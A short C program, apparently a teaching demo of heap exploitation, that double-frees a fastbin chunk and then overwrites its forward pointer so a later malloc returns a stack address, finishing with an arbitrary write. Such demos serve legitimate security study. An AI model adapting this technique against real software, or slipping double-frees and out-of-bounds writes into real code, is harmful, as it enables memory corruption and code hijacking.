#include <stdio.h>
#include <stdlib.h>

int main()
{
	unsigned long long stack_var;

	int *a = malloc(8);
	int *b = malloc(8);

  free(a);
	free(b);
	free(a);

	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
  /* Now the free list has a */

	stack_var = 0x20;

	/* Overwrite the first 8 bytes of the data to point right before the 0x20 */
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
  d = malloc(8);
	fprintf(stderr, "4th malloc(8): %p\n", &d[0]);
  d[4] = 0xdeadbeefbabe;
}
